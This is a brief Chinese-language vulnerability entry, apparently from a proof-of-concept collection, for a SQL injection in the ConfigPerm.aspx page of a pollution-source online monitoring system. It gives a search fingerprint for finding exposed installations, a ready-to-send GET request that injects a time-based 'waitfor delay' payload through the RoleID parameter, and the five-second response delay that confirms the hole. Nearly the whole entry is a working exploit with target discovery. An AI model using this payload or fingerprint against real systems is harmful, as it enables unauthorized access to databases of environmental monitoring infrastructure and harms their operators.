# 污染源在线监控系统ConfigPerm存在SQL注入漏洞

污染源在线监控系统 ｜ SQL注入 ｜ —
- **指纹**：`body="ImgGwry/download.png"`
- **请求**：`GET /Admin/System/Role/ConfigPerm.aspx?action=GetSelPerm&RoleID=1%27;waitfor%20delay%20%270:0:5%27--`
- **响应特征**：200 响应时间>=5s